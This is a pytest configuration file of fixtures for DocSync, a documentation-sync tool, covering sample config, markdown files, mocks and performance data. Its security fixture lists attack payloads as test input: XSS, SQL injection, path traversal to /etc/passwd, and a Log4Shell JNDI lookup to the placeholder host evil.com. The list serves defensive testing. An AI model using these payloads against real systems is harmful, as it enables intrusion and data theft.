"""
Enterprise-grade test configuration and fixtures for DocSync.

Follows pytest best practices with comprehensive test infrastructure.
"""

import asyncio
import logging
import tempfile
from collections.abc import Generator
from pathlib import Path
from unittest.mock import AsyncMock, Mock

import pytest
import yaml


# Session-scoped event loop for async tests
@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


# Core configuration fixtures
@pytest.fixture
def sample_config() -> dict:
    """Provide sample configuration for testing."""
    return {
        "templates_dir": "templates",
        "output_dir": "output",
        "log_level": "INFO",
        "esg": {
            "metrics_enabled": True,
            "output_format": "markdown",
            "validation_level": "strict",
        },
        "sync": {
            "auto_sync": True,
            "sync_interval": 300,
            "conflict_handling": "ask",
            "retry_attempts": 3,
        },
        "guardrive": {
            "enabled": False,
            "base_path": "",
        },
    }


# File system fixtures
@pytest.fixture
def temp_dir() -> Generator[Path, None, None]:
    """Provide a temporary directory for test files."""
    with tempfile.TemporaryDirectory(prefix="docsync_test_") as tmp_dir:
        yield Path(tmp_dir)


@pytest.fixture
def config_file(temp_dir: Path, sample_config: dict) -> Path:
    """Create a temporary config file for testing."""
    config_path = temp_dir / "test_config.yaml"
    with open(config_path, "w") as f:
        yaml.dump(sample_config, f)
    return config_path


# Content fixtures
@pytest.fixture
def sample_markdown() -> str:
    """Provide sample markdown content for testing."""
    return """---
title: Test Document
version: 1.0.0
author: Test Author
date: 2025-07-01
---

# Test Document

This is a test document with:

- **Bold text**
- *Italic text*
- [Links](http://example.com)

## Code Example

```python
def hello_world():
    print("Hello, World!")
```

## Table

| Column 1 | Column 2 |
|----------|----------|
| Value 1  | Value 2  |
"""


@pytest.fixture
def sample_files(temp_dir: Path, sample_markdown: str) -> dict:
    """Create sample files for testing."""
    files = {
        "readme": temp_dir / "README.md",
        "docs": temp_dir / "docs",
        "config": temp_dir / "config.yaml",
    }

    # Create directories
    files["docs"].mkdir(exist_ok=True)

    # Create files
    files["readme"].write_text(sample_markdown)
    (files["docs"] / "test.md").write_text(sample_markdown)

    return files


# Mock fixtures
@pytest.fixture
def mock_notion_client():
    """Provide a mock Notion client."""
    client = Mock()
    client.verify_connection = AsyncMock(return_value=True)
    client.get_page = AsyncMock(return_value={"id": "test_id"})
    client.create_page = AsyncMock(return_value={"id": "new_id"})
    client.update_page = AsyncMock(return_value={"id": "updated_id"})
    return client


@pytest.fixture
def mock_http_session():
    """Provide a mock HTTP session."""
    session = Mock()
    session.request = AsyncMock()
    session.close = AsyncMock()
    return session


# Performance testing fixtures
@pytest.fixture
def performance_config() -> dict:
    """Configuration for performance testing."""
    return {
        "large_file_size": 1024 * 1024,  # 1MB
        "concurrent_operations": 10,
        "timeout_seconds": 30,
    }


@pytest.fixture
def benchmark_data():
    """Provide benchmark data for performance tests."""
    return {
        "expected_sync_time": 5.0,  # seconds
        "max_memory_usage": 100 * 1024 * 1024,  # 100MB
        "max_cpu_usage": 80,  # percentage
    }


# Security testing fixtures
@pytest.fixture
def security_test_data():
    """Provide test data for security testing."""
    return {
        "malicious_input": [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ],
        "large_payload": "A" * (10 * 1024 * 1024),  # 10MB
        "special_chars": "!@#$%^&*()_+-=[]{}|;:,.<>?",
    }


# Logger fixture
@pytest.fixture
def test_logger():
    """Create a test logger instance."""
    logger = logging.getLogger("docsync_test")
    logger.setLevel(logging.DEBUG)

    # Clear existing handlers
    logger.handlers.clear()

    # Add console handler
    handler = logging.StreamHandler()
    handler.setLevel(logging.DEBUG)
    formatter = logging.Formatter(
        "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    )
    handler.setFormatter(formatter)
    logger.addHandler(handler)

    return logger


# Custom pytest markers
pytest_plugins = ["pytest_asyncio"]


def pytest_configure(config):
    """Configure custom pytest markers."""
    config.addinivalue_line(
        "markers",
        "unit: Unit tests that test individual components",
    )
    config.addinivalue_line(
        "markers",
        "integration: Integration tests that test component interactions",
    )
    config.addinivalue_line(
        "markers",
        "e2e: End-to-end tests that test complete workflows",
    )
    config.addinivalue_line("markers", "performance: Performance and load testing")
    config.addinivalue_line("markers", "security: Security and vulnerability testing")
    config.addinivalue_line("markers", "slow: Tests that take longer than 5 seconds")
